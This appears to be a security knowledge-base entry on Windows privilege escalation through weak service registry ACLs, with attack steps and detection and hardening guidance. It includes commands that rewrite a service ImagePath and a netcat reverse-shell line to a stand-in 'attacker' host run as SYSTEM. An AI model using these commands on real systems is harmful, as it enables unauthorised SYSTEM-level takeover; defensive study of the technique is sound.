examples.label: Find services with weak registry ACLs

notes:
=== Weak Registry ACL — Service ImagePath Modification ===
Write access to service registry key allows modifying ImagePath to point to malicious binary.

=== TECHNICAL MECHANISM ===
Service configuration is stored in: HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
If a low-privilege user can write to this key, they can modify ImagePath directly
This bypasses the service object's own ACL in SCM — registry ACL is separate from service DACL.

=== DISCOVERY ===
  accesschk.exe -kvuqsw hklm\system\currentcontrolset\services
  Flags: -k registry key, -v verbose, -u suppress errors, -q suppress banner, -s recursive, -w writable only
  Look for: low-privilege principals (Users, Authenticated Users) with write access

Manual check for specific service:
  accesschk.exe -kvuq hklm\system\currentcontrolset\services\<ServiceName>
  Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" | Format-List

=== ATTACK FLOW ===
1. Identify vulnerable key: accesschk sweep
2. Read current ImagePath (for cleanup):
   reg query "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath
3. Replace with attacker command:
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" -Name ImagePath -Value "C:\Tools\shell.exe"
   OR: reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Tools\shell.exe" /f
4. Restart service:
   sc stop <ServiceName>; sc start <ServiceName>
5. Cleanup:
   Set-ItemProperty ... -Value "C:\original\path\service.exe"

=== DIFFERENCE FROM SERVICE OBJECT ACL ===
Registry ACL: modifies HKLM directly (requires registry write permission, bypasses SCM)
Service object ACL: uses sc config via Service Control Manager (requires service DACL write)
Both achieve the same result (arbitrary command as SYSTEM on service start)

=== CHAINING CONTEXT ===
Weak registry ACL → ImagePath = reverse shell → SYSTEM → lateral movement
Third-party installers that set wide-open ACLs on service registry keys
Combine with other findings: may need to disable AV before modifying registry

=== WHAT TO LOOK FOR ===
BUILTIN\Users or Everyone with KEY_WRITE on any service registry key
NT AUTHORITY\Authenticated Users with write = any domain user can exploit
Services with non-standard registry key permissions (inherited from parent with wrong ACLs)
name: Weak Permissions - Writable Service Registry (ImagePath)
description: If a service's registry key is writable (accesschk -kvuqsw on hklm\System\CurrentControlSet\services), change ImagePath directly to your payload command and restart the service.

defense.why_it_works: Service configuration is stored in the registry under HKLM\SYSTEM\CurrentControlSet\Services. The ImagePath value defines the binary to execute. If a non-admin user has write access to a service's registry key (discovered via accesschk), they can modify ImagePath to point to an arbitrary binary. On next service start, that binary executes in the service account's context (often SYSTEM).
defense.prerequisites: Write access on a service registry key (SET_VALUE or KEY_ALL_ACCESS for non-admin user). The service must be startable/restartable. accesschk to identify writable keys.
defense.impact: Arbitrary code execution as the service account (SYSTEM or privileged account) via registry ImagePath modification.
defense.detection: accesschk on HKLM\SYSTEM\CurrentControlSet\Services by standard user. Set-ItemProperty on a service ImagePath key by non-admin (Event 4657: registry key modified). Service restart with unexpected binary. Sysmon Event 13: registry value set on service ImagePath by non-admin.
defense.artifacts: Registry: ImagePath modified by non-admin (Sysmon Event 13) | Security event 4657: registry key write on service key | Process: new binary executed in service context
defense.prevention: Audit registry ACLs on all service keys. Restrict to SYSTEM and Administrators only. Use accesschk.exe to audit: `accesschk.exe -kvuqsw HKLM\System\CurrentControlSet\Services`. Apply CIS Benchmark registry hardening.
defense.misconfiguration: Third-party application or misconfigured group policy grants non-admin users WRITE access on service registry keys. Default service keys normally restricted, but custom application services may be misconfigured.
defense.vulnerable_config:
# Writable service registry key:
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services
# HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc -> BUILTIN\Users: KEY_ALL_ACCESS

# Exploit:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc' -Name ImagePath -Value 'C:\Tools\nc.exe attacker 443 -e cmd'
sc start VulnSvc  # executes netcat as SYSTEM
defense.secure_config:
# Audit service registry ACLs:
accesschk.exe -kvuqsw HKLM\System\CurrentControlSet\Services > svc_reg_acls.txt

# Fix permissive ACL on specific service key:
$acl = Get-Acl 'HKLM:\System\CurrentControlSet\Services\VulnSvc'
$acl.SetAccessRuleProtection($true, $false)
Set-Acl 'HKLM:\System\CurrentControlSet\Services\VulnSvc' $acl

# Restrict to SYSTEM + Administrators only
